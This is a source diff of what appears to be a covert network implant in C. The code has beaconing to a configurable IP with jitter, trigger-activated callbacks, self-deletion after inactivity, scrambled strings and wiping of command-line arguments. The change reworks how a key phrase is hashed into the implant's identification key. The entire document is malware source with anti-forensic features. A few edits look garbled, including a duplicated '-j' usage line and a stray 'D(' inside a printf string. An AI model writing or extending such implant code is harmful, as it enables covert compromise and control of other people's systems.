@@ -20,6 +20,9 @@
 #include "self_delete.h"
 #include "threads.h"
 #include "run_command.h"
+#include "trigger_payload.h"
+#include "polarssl/sha1.h"
+
 
 //PolarSSL Files
 #include "polarssl/include/polarssl/config.h"
@@ -49,24 +52,8 @@ int wsa_init_done;
 extern int wsa_init_done;
 #endif
 
-//declare displaySha1Hash function
-void displaySha1Hash(char *label, unsigned char *sha1Hash);
-//define displaySha1Hash function
-void displaySha1Hash(char *label, unsigned char *sha1Hash)
-{
-	int i=0;
-
-	//Display Label
-	D( printf( " DEBUG: %s=[", label ); );
-
-	//Display 40 hexadecimal number array
-	for (i=0; i<20; i++)
-	{
-	   D( printf("%02x",sha1Hash[i]); );
-	}
-	D( printf( "]\n" ); );
-
-}
+// Global
+unsigned char	implantKey[ID_KEY_HASH_SIZE];
 
 //**************************************************************
 struct cl_args
@@ -76,7 +63,7 @@ struct cl_args
 	unsigned int	host_len;
 	char		beacon_ip[256];
 	char		iface[16];
-	unsigned char   idKey[20];
+	unsigned char   idKey[ID_KEY_HASH_SIZE];
 	unsigned long	init_delay;
 	unsigned int	interval;
 	unsigned int	trigger_delay;
@@ -86,6 +73,7 @@ struct cl_args
 };
 
 #define SIG_HEAD	0x7AD8CFB6
+
 struct cl_args		args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };
 
 //**************************************************************
@@ -99,10 +87,11 @@ static void printUsage(char* exeName)
 	printf("\t\t-i <interval>          - beacon interval in seconds\n");
 	printf("\t\t-k <id key>            - implant Key derived from patching keyPhrase \n");
 	printf("\t\t-j <jitter>            - integer for percent jitter (0 <= jitter <= 30, default: 3 )\n");
+	printf("\t\t-j <ID key>            - identification key (REQUIRED)\n");
 #ifdef SOLARIS
 	printf("\t\t-I <interface>         - interface on which to listen\n");
 #endif
-	printf("\t\t-d <beacon delay>      - initial beacon delay (in seconds, default: 2 minutes)\n");
+	printf("\t\t-d <beacon delay>      - initial beacon delay (in seconds, default: 2 minutes)D( \n");
 	printf("\t\t-t <callback delay>    - delay between trigger received and callback +/- 30 seconds (in seconds)\n");
 	printf("\t\t-s <self-delete delay> - since last successful trigger/beacon (in seconds, default: 60 days)\n");
 	printf("\t\t-h                     - print this help menu\n");
@@ -127,8 +116,6 @@ int main(int argc, char** argv)
 	int		c = 0;
 	char		*beaconIP = NULL;
 	char		*szInterface = NULL;
-	unsigned char   idKey[20];
-	unsigned char   tempSha1Hash[20];   
 	int		beaconPort = DEFAULT_BEACON_PORT;
 	unsigned long	initialDelay = DEFAULT_INITIAL_DELAY;
 	int		interval = DEFAULT_BEACON_INTERVAL;
@@ -153,8 +140,9 @@ int main(int argc, char** argv)
 	int exe_path_size = 256;
 #endif
 
-    // De-scramble strings
-    init_strings();
+ 	implantKey[0] = '\0';
+
+	init_strings(); 	// De-scramble strings
 
 	// Check to see if we have sufficient root/admin permissions to continue.
 	// root/admin permissions required for RAW sockets and [on windows] discovering
@@ -253,7 +241,7 @@ int main(int argc, char** argv)
 		szInterface = args.iface;
 		initialDelay = args.init_delay;
 		interval = args.interval;
-		memcpy( idKey, args.idKey, 20*sizeof(unsigned char) );           //Copy patched idKey
+		memcpy(implantKey, args.idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
 		trigger_delay = args.trigger_delay;
 		delete_delay = args.delete_delay;
 		jitter = args.jitter * 0.01f;
@@ -276,13 +264,14 @@ int main(int argc, char** argv)
 	{
 		switch(c)
 		{
+			case 'I':
+				// TODO: new option. what validation is needed?
+				szInterface = asloc( optarg );
+				break;
+
 			case 'a':
 				// todo: check that IP address is valid -- see client for howto
 				beaconIP = asloc( optarg );//optarg;
-				break;
-
-			case 'p':
-				beaconPort = atoi(optarg);
 				break;
 
 			case 'd':
@@ -296,38 +285,6 @@ int main(int argc, char** argv)
 				interval = atoi(optarg) * 1000;
 				break;
 
-			case 'k':
-				// user keyPhrase used for id 
-                                if ( strlen( optarg ) < 8 )
-                                {
-                                        printf( " ERROR: Insufficient length for keyPhrase entered, must be greater than 7 characters limit\n" );
-                                        return -1;
-                                }
-
-                                sha1( (const unsigned char*) optarg, strlen(optarg), tempSha1Hash);    //Compute sha1 hash of keyPhrase1Hash
-                                sha1( (const unsigned char*) tempSha1Hash, 20*sizeof(unsigned char), idKey); 
-				D( printf( "\n\n\n DEBUG: keyPhrase=%s \n", optarg) );
-				displaySha1Hash ("triggerKey", tempSha1Hash);
-				displaySha1Hash ("idKey", idKey);
-				D( printf( "]\n\n\n" ); );
-				break;
-
-			case 't':
-				// user enters delay in seconds and this is converted to milliseconds
-				trigger_delay = atoi(optarg) * 1000;
-				break;
-
-			case 'I':
-				// TODO: new option. what validation is needed?
-				szInterface = asloc( optarg );
-				break;
-
-			case 's':
-				// user enters self delete delay in seconds, this is NOT converted to milliseconds since Sleep is not used...
-				//delete_delay = atoi(optarg);
-				delete_delay =  strtoul( optarg, NULL, 10);
-				break;
-
 			case 'j':
 				if ( ( atoi(optarg) >= 0 ) && ( atoi(optarg) <= 30 ) )
 				{
@@ -337,6 +294,36 @@ int main(int argc, char** argv)
 				{
 					jitter=-1;
 				}
+				break;
+
+			case 'k':
+				// The ID key specified is stored as the SHA-1 hash of the SHA-1 hash of the text entered,
+				// hence the name idKeyHash2.
+                                if ( strlen( optarg ) < ID_KEY_LENGTH_MIN ) {
+                                        printf( " ERROR: Insufficient length for key phrase; must be greater than %i characters\n", ID_KEY_LENGTH_MIN);
+            				exit (1);
+                                }
+				D( printf( "\n\n\n DEBUG: keyPhrase=%s \n", optarg) );
+				sha1((const unsigned char *)optarg, strlen(optarg), implantKey);
+				D( displaySha1Hash ("Trigger Key", implantKey); );
+				sha1(implantKey, ID_KEY_HASH_SIZE, implantKey);
+				D( displaySha1Hash ("Implant Key", implantKey); );
+				D( printf("\n\n\n" ); );
+				break;
+
+			case 'p':
+				beaconPort = atoi(optarg);
+				break;
+
+			case 's':
+				// user enters self delete delay in seconds, this is NOT converted to milliseconds since Sleep is not used...
+				//delete_delay = atoi(optarg);
+				delete_delay =  strtoul( optarg, NULL, 10);
+				break;
+
+			case 't':
+				// user enters delay in seconds and this is converted to milliseconds
+				trigger_delay = atoi(optarg) * 1000;
 				break;
 
 			default:
@@ -384,6 +371,13 @@ int main(int argc, char** argv)
 		D( printUsage(argv[0]); )
 		return 0;
 	}
+
+	if (implantKey[0] == '\0')
+	{
+		D( printUsage(argv[0]); )
+		return 0;
+	}
+
 #ifdef SOLARIS
 // SOLARIS raw socket implementation requires that we specify the specific interface to sniff
 	if ( !szInterface )
@@ -394,7 +388,7 @@ int main(int argc, char** argv)
 	}
 #endif
 
-	// for linux and solaris, zeroize command line arguments
+	// for Linux and Solaris, zeroize command line arguments
 	clean_args( argc, argv, NULL );	
 
 // if the binary has been patched, we don't need to parse command line arguments
